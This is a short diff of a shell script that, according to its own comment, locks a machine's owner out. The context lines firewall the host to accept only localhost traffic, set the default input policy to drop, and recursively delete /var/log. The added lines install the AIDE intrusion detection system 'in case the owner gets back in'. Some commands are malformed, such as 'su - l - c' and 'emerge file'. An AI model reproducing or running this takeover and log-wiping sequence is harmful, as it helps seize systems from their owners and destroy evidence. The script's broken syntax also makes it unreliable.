@@ -40,6 +40,12 @@ su -l -c "emerge /directory/iptables && iptables -A INPUT -p tcp -s 127.0.0.1 --
 su -l -c "iptables -P INPUT DROP"
  
 su -l -c "rm -rf /var/log && rm -rf /var/logs"
+
+# Installs the AIDE intrusion detection system in case the owner gets back in.
+
+su -l -c "emerge file /directory/aide && aideinit"
+
+su - l - c "cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db"
  
 echo 'Complete!'
  
